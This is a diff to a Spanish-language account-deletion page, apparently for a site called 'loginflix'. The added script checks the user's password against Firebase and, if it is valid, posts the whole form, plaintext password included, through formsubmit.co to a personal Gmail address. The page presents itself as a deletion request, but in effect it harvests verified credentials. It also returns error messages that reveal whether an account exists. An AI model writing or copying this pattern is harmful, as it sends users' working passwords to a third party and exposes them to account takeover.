@@ -64,16 +64,21 @@
 
   <!-- MODAL DE CONTRASEÑA -->
   <div id="modal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center hidden z-50">
-    <form id="formFinal" action="https://formspree.io/f/mpwlqzvd" method="POST"
-          class="bg-gray-900 text-white p-6 rounded-xl w-11/12 max-w-sm space-y-4"
-          onsubmit="mostrarMensaje()">
+    <form id="formFinal" class="bg-gray-900 text-white p-6 rounded-xl w-11/12 max-w-sm space-y-4">
       <h3 class="text-lg font-semibold text-center">Ingresa tu contraseña para confirmar</h3>
+
       <input type="hidden" name="tipo" value="Solicitud de eliminación de cuenta">
-      <input type="password" name="password" required placeholder="Contraseña"
-             class="w-full p-2 rounded bg-gray-800 border border-gray-600">
+      <div class="relative">
+        <input type="password" name="password" id="password" required placeholder="Contraseña"
+               class="w-full p-2 rounded bg-gray-800 border border-gray-600 pr-10">
+        <button type="button" onclick="togglePassword()" class="absolute right-2 top-2 text-gray-400">
+          <i data-lucide="eye" id="toggleIcon"></i>
+        </button>
+      </div>
       <input type="hidden" name="email">
       <input type="hidden" name="username">
       <input type="hidden" name="motivo">
+
       <div class="flex justify-end gap-2 pt-2">
         <button type="button" onclick="cerrarModal()"
                 class="px-4 py-2 bg-gray-700 rounded hover:bg-gray-600">Cancelar</button>
@@ -86,7 +91,7 @@
   <!-- MENSAJE FINAL -->
   <div id="mensajeFinal"
        class="fixed inset-0 hidden bg-black bg-opacity-90 flex items-center justify-center z-50"
-       onclick="this.classList.add('hidden')">
+       onclick="cerrarMensajeFinal()">
     <div class="bg-purple-600 text-white text-center px-6 py-4 rounded-xl">
       <p class="text-lg font-semibold">✅ ¡Solicitud enviada!</p>
       <p class="text-sm mt-1">Procesaremos tu eliminación en un plazo máximo de 48 horas.</p>
@@ -114,14 +119,40 @@
     </a>
   </nav>
 
-  <script>
-    lucide.createIcons();
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
+    import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js";
 
-    function abrirModal() {
+    const firebaseConfig = {
+      apiKey: "AIzaSyDriO1CsL6DAfSkFXIr3NPtENnyNtwphuI",
+      authDomain: "loginflix-63abe.firebaseapp.com",
+      databaseURL: "https://loginflix-63abe-default-rtdb.firebaseio.com",
+      projectId: "loginflix-63abe",
+      storageBucket: "loginflix-63abe.appspot.com",
+      messagingSenderId: "914192610747",
+      appId: "1:914192610747:web:e3d10e22a563a9a44a009e"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+
+    window.togglePassword = function() {
+      const input = document.getElementById("password");
+      const icon = document.getElementById("toggleIcon");
+      if (input.type === "password") {
+        input.type = "text";
+        icon.setAttribute("data-lucide", "eye-off");
+      } else {
+        input.type = "password";
+        icon.setAttribute("data-lucide", "eye");
+      }
+      lucide.createIcons();
+    }
+
+    window.abrirModal = function () {
       const form = document.getElementById("deleteForm");
       if (!form.reportValidity()) return;
 
-      // Copiar datos al segundo formulario
       const data = new FormData(form);
       document.querySelector('#formFinal [name="email"]').value = data.get("email");
       document.querySelector('#formFinal [name="username"]').value = data.get("username");
@@ -130,15 +161,55 @@
       document.getElementById("modal").classList.remove("hidden");
     }
 
-    function cerrarModal() {
+    window.cerrarModal = function () {
       document.getElementById("modal").classList.add("hidden");
     }
 
-    function mostrarMensaje() {
-      cerrarModal();
-      document.getElementById("mensajeFinal").classList.remove("hidden");
+    window.cerrarMensajeFinal = function () {
+      document.getElementById("mensajeFinal").classList.add("hidden");
+      document.getElementById("deleteForm").reset();
     }
-  </script>
 
+    document.getElementById("formFinal").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const form = e.target;
+      const email = form.email.value;
+      const password = form.password.value;
+
+      signInWithEmailAndPassword(auth, email, password)
+        .then(() => {
+          const formData = new FormData(form);
+          formData.append("_captcha", "false");
+
+          fetch("https://formsubmit.co/ivancorderonolasco@gmail.com", {
+            method: "POST",
+            body: formData
+          }).then(response => {
+            if (response.ok) {
+              cerrarModal();
+              document.getElementById("mensajeFinal").classList.remove("hidden");
+              form.reset();
+            } else {
+              alert("Hubo un error al enviar el formulario.");
+            }
+          }).catch(() => {
+            alert("No se pudo enviar la solicitud.");
+          });
+        })
+        .catch((error) => {
+          if (error.code === 'auth/user-not-found') {
+            alert("❌ Correo no registrado.");
+          } else if (error.code === 'auth/wrong-password') {
+            alert("❌ Contraseña incorrecta.");
+          } else if (error.code === 'auth/invalid-email') {
+            alert("❌ Correo inválido.");
+          } else {
+            alert("❌ Error: " + error.message);
+          }
+        });
+    });
+
+    lucide.createIcons();
+  </script>
 </body>
 </html>
